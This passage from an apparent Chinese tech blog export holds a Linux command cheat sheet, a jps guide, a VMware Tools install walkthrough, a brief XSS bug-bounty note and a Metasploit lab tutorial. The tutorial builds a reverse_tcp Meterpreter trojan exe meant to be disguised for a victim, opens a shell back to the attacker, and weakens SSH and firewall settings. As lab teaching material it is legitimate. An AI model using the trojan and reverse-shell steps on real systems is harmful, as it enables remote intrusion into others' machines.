dosfsck /dev/hda1 修复/检查hda1磁盘上dos文件系统的完整性 初始化一个文件系统mkfs /dev/hda1 在hda1分区创建一个文件系统 mke2fs /dev/hda1 在hda1分区创建一个linux ext2的文件系统 mke2fs -j /dev/hda1 在hda1分区创建一个linux ext3(日志型)的文件系统 mkfs -t vfat 32 -F /dev/hda1 创建一个 FAT32 文件系统 fdformat -n /dev/fd0 格式化一个软盘 mkswap /dev/hda3 创建一个swap文件系统 SWAP文件系统mkswap /dev/hda3 创建一个swap文件系统 swapon /dev/hda3 启用一个新的swap文件系统 swapon /dev/hda2 /dev/hdb3 启用两个swap分区 备份dump -0aj -f /tmp/home0.bak /home 制作一个 ‘/home’ 目录的完整备份 dump -1aj -f /tmp/home0.bak /home 制作一个 ‘/home’ 目录的交互式备份 restore -if /tmp/home0.bak 还原一个交互式备份 rsync -rogpav –delete /home /tmp 同步两边的目录 rsync -rogpav -e ssh –delete /home ip_address:/tmp 通过SSH通道rsync rsync -az -e ssh –delete ip_addr:/home/public /home/local 通过ssh和压缩将一个远程目录同步到本地目录 rsync -az -e ssh –delete /home/local ip_addr:/home/public 通过ssh和压缩将本地目录同步到远程目录 dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr ‘dd of=hda.gz’ 通过ssh在远程主机上执行一次备份本地磁盘的操作 dd if=/dev/sda of=/tmp/file1 备份磁盘内容到一个文件 tar -Puf backup.tar /home/user 执行一次对 ‘/home/user’ 目录的交互式备份操作 ( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr ‘cd /home/share/ &amp;&amp; tar x -p’ 通过ssh在远程目录中复制一个目录内容 ( tar c /home ) | ssh -C user@ip_addr ‘cd /home/backup-home &amp;&amp; tar x -p’ 通过ssh在远程目录中复制一个本地目录 tar cf - . | (cd /tmp/backup ; tar xf - ) 本地将一个目录复制到另一个地方，保留原有权限及链接 find /home/user1 -name ‘*.txt’ | xargs cp -av –target-directory=/home/backup/ –parents 从一个目录查找并复制所有以 ‘.txt’ 结尾的文件到另一个目录 find /var/log -name ‘*.log’ | tar cv –files-from=- | bzip2 &gt; log.tar.bz2 查找所有以 ‘.log’ 结尾的文件并做成一个bzip包 dd if=/dev/hda of=/dev/fd0 bs=512 count=1 做一个将 MBR (Master Boot Record)内容复制到软盘的动作 dd if=/dev/fd0 of=/dev/hda bs=512 count=1 从已经保存到软盘的备份中恢复MBR内容 光盘cdrecord -v gracetime=2 dev=/dev/cdrom -eject blank=fast -force 清空一个可复写的光盘内容 mkisofs /dev/cdrom &gt; cd.iso 在磁盘上创建一个光盘的iso镜像文件 mkisofs /dev/cdrom | gzip &gt; cd_iso.gz 在磁盘上创建一个压缩了的光盘iso镜像文件 mkisofs -J -allow-leading-dots -R -V “Label CD” -iso-level 4 -o ./cd.iso data_cd 创建一个目录的iso镜像文件 cdrecord -v dev=/dev/cdrom cd.iso 刻录一个ISO镜像文件 mount -o loop cd.iso /mnt/iso 挂载一个ISO镜像文件 cd-paranoia -B 从一个CD光盘转录音轨到 wav 文件中 cd-paranoia – “-3” 从一个CD光盘转录音轨到 wav 文件中（参数-3） cdrecord –scanbus 扫描总线以识别scsi通道 dd if=/dev/hdc | md5sum 校验一个设备的md5sum编码，例如一张 CD 网络 - （以太网和WIFI无线）ifconfig eth0 显示一个以太网卡的配置 ifup eth0 启用一个 ‘eth0’ 网络设备 ifdown eth0 禁用一个 ‘eth0’ 网络设备 ifconfig eth0 192.168.1.1 netmask 255.255.255.0 控制IP地址 ifconfig eth0 promisc 设置 ‘eth0’ 成混杂模式以嗅探数据包 (sniffing) dhclient eth0 以dhcp模式启用 ‘eth0’ route -n show routing table route add -net 0/0 gw IP_Gateway configura default gateway route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 configure static route to reach network ‘192.168.0.0/16’ route del 0/0 gw IP_gateway remove static route echo “1” &gt; /proc/sys/net/ipv4/ip_forward activate ip routing hostname show hostname of system host www.example.com lookup hostname to resolve name to ip address and viceversa nslookup www.example.com lookup hostname to resolve name to ip address and viceversa ip link show show link status of all interfaces mii-tool eth0 show link status of ‘eth0’ ethtool eth0 show statistics of network card ‘eth0’ netstat -tup show all active network connections and their PID netstat -tupl show all network services listening on the system and their PID tcpdump tcp port 80 show all HTTP traffic iwlist scan show wireless networks iwconfig eth1 show configuration of a wireless network card hostname show hostname host www.example.com lookup hostname to resolve name to ip address and viceversa nslookup www.example.com lookup hostname to resolve name to ip address and viceversa whois www.example.com lookup on Whois database JPS工具ps(Java Virtual Machine Process Status Tool)是JDK 1.5提供的一个显示当前所有java进程pid的命令，简单实用，非常适合在linux/unix平台上简单察看当前java进程的一些简单情况。 ​ 我想很多人都是用过unix系统里的ps命令，这个命令主要是用来显示当前系统的进程情况，有哪些进程，及其 id。 jps 也是一样，它的作用是显示当前系统的java进程情况，及其id号。我们可以通过它来查看我们到底启动了几个java进程（因为每一个java程序都会独占一个java虚拟机实例），和他们的进程号（为下面几个程序做准备），并可通过opt来查看这些进程的详细启动参数。 ​ 使用方法：在当前命令行下打 jps(需要JAVA_HOME，没有的话，到改程序的目录下打) 。 jps存放在JAVA_HOME/bin/jps，使用时为了方便请将JAVA_HOME/bin/加入到Path. $&gt; jps 23991 Jps 23789 BossMain 23651 Resin 比较常用的参数：-q 只显示pid，不显示class名称,jar文件名和传递给main 方法的参数 $&gt; jps -q 28680 23789 23651 -m 输出传递给main 方法的参数，在嵌入式jvm上可能是null-m 输出传递给main 方法的参数，在嵌入式jvm上可能是null $&gt; jps -m 28715 Jps -m 23789 BossMain 23651 Resin -socketwait 32768 -stdout /data/aoxj/resin/log/stdout.log -stderr /data/aoxj/resin/log/stderr.log -l 输出应用程序main class的完整package名 或者 应用程序的jar文件完整路径名$&gt; jps -l 28729 sun.tools.jps.Jps 23789 com.asiainfo.aimc.bossbi.BossMain 23651 com.caucho.server.resin.Resin -v 输出传递给JVM的参数$&gt; jps -v 23789 BossMain 28802 Jps -Denv.class.path=/data/aoxj/bossbi/twsecurity/java/trustwork140.jar:/data/aoxj/bossbi/twsecurity/java/:/data/aoxj/bossbi/twsecurity/java/twcmcc.jar:/data/aoxj/jdk15/lib/rt.jar:/data/aoxj/jd k15/lib/tools.jar -Dapplication.home=/data/aoxj/jdk15 -Xms8m 23651 Resin -Xss1m -Dresin.home=/data/aoxj/resin -Dserver.root=/data/aoxj/resin -Djava.util.logging.manager=com.caucho.log.LogManagerImpl - Djavax.management.builder.initial=com.caucho.jmx.MBeanServerBuilderImpl sudo jps看到的进程数量最全 jps 192.168.0.77 列出远程服务器192.168.0.77机器所有的jvm实例，采用rmi协议，默认连接端口为1099 前提是远程服务器提供jstatd服务） 注：jps命令有个地方很不好，似乎只能显示当前用户的java进程，要显示其他用户的还是只能用unix/linux的ps命令。输入正文]]></content>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 7]]></title>
    <url>%2F2019%2F08%2F10%2FCentOS-7%2F</url>
    <content type="text"><![CDATA[Linux(CentOS 7)命令行模式安装VMware Tools 详解本例中为在Linux（以CentOS 7为例）安装VMware Tools。 这是全文 1.首先启动CentOS 7,在VMware中点击上方“VM”，点击“Install VMware Tools…”（如已安装则显示“Reinstall VMware Tools…”）。 2.在命令行输入“ls /dev”查看。 3.输入“mkdir /mnt/cdrom”在/mnt目录下新建一个名为cdrom的文件夹。 4.输入“mount -t iso9660 /dev/cdrom /mnt/cdrom”将光盘挂载到/mnt/cdrom目录下。 5.输入“ls /mnt/cdrom/”查看内容，输入“cp /mnt/cdrom/VMwareTools-9.2.0-799703.tar.gz /root/vm.tar.gz”,将名为“VMwareTools-9.2.0-799703.tar.gz”复制到/root目录下，并重新命名为vm.tar.gz。 6.在根目录下输入“ls”查看文件，输入“tar -xzf vm.tar.gz”将文件解压，输入“ls”查看文件，可发现新增目录“vmware-tools-distrib”。 7.输入“cd vmware-tools-distrib/”进入名为“vmware-tools-distrib”的目录，输入“./vmware-install.pl”尝试安装，出现错误“-bash: ./vmware-install.pl: /usr/bin/per: bad interpreter: No such file or directory”，表明未安装编译环境。 8.输入“yum -y install perl gcc make kernel-headers kernel-devel”开始安装。 9.提示已经安装完毕。 10.在“vmware-tools-distrib”目录下重新输入“./vmware-install.pl”开始安装，基本上按回车键即可。 11.VMware Tools已经安装完毕，提示可以运行“/usr/bin/vmware-uninstall-tools.pl”命令卸载VMware Tools。第一次运行时需运行“/usr/bin/vmware-config-tools.pl”命令配置VMware Tools，按回车键直接运行。 12.提示已经安装完毕，可以开始使用。 13.输入”/usr/bin/vmware-user”启动vmware用户进程，并输入”startx“启动图形界面。 14.选择文件（本例中为”测试文档.docx”）并摁住鼠标左键不放，尝试拖动文件到虚拟机。 15.放开鼠标左键，发现文件已经复制到虚拟机。 16.如需卸载VMware Tools，输入“/usr/bin/vmware-uninstall-tools.pl”即可。 17.如需在Gnome GUI图形界面下安装，则只需将文件解压，然后再文件夹里点鼠标右键，选择“Open in Terminal”,在Terminal里面输入“./vmware-install.pl”即可。 安装故障18.如安装时出现类似下图错误，提示无法删除open-vm-tools，则可能是因为上次安装失败造成。 19.如尝试输入“/usr/bin/vmware-uninstall-tools.pl”仍无法卸载，则输入“rpm -e open-vm-tools-desktop”卸载并重新安装。]]></content>
      <tags>
        <tag>基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SRC]]></title>
    <url>%2F2019%2F08%2F09%2FSRC%2F</url>
    <content type="text"><![CDATA[记录第一个中危漏 携程XSS 漏洞 漏洞编号vulbox-2019-0201455]]></content>
      <tags>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[metasploit之后门的生成]]></title>
    <url>%2F2019%2F08%2F09%2Fmetasploit%2F</url>
    <content type="text"><![CDATA[后门简介后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。 实验环境Kali linux ip 192.168.10.128 WIN7 ip 10.0.2.2 选择以下攻击载荷并生成一个exe的木马程序 命令msfconsole 开启Metasploit 查看payload，使用命令show payloads，msf提供了多种攻击载荷 选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe 其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下 使用命令 cd /，可以看到我们生成的exe文件 接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。 为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。 在kali linux上打开ssh服务的方法： apt-get install openssh-server#安装 一、配置SSH参数 修改sshd_config文件，命令为： vi /etc/ssh/sshd_config 将#PasswordAuthentication no的注释去掉，并且将NO修改为YES，kali中默认是yes 右击桌面，单击打开终端，输入命令 将PermitRootLogin without-password修改为 PermitRootLogin yes 二、启动SSH服务 命令为： /etc/init.d/ssh start 或者 service ssh start 查看SSH服务状态是否正常运行，命令为 /etc/init.d/ssh status 或者service ssh status 那么需要生成两个密钥： ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key ssh-keygen -t dsa -f /etc/ssh/ssh_host_rsa_key 执行命令后都会让输入密码，直接敲回车设置为空即可 Win7关闭防火墙的方法 接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128 ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。 在msf中设置监听 use exploit/multi/handler show options 设置我们后门生成时的攻击载荷 set payload windows/meterpreter/reverse_tcp show options set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp 设置参数（与后门的参数相对应） msf exploit(multi/handler) &gt; set LHOST 192.168.10.128 LHOST =&gt; 192.168.10.128 msf exploit(multi/handler) &gt; set LPORT 4444 LPORT =&gt; 4444 msf exploit(multi/handler) &gt; run 在windows主机上点击123.exe。当被攻击者运行了我们上传的后门程 序时，会弹回一个shell [*] Started reverse TCP handler on 192.168.10.128:4444 [*] Sending stage (179779 bytes) to 192.168.10.1 [*] Sleeping before handling stage… [*] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800 实验结束]]></content>
      <tags>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[签名]]></title>
    <url>%2F2019%2F08%2F08%2Fhello-world%2F</url>
    <content type="text"><![CDATA[不着急 不害怕 不要脸 无所谓]]></content>
  </entry>
</search>
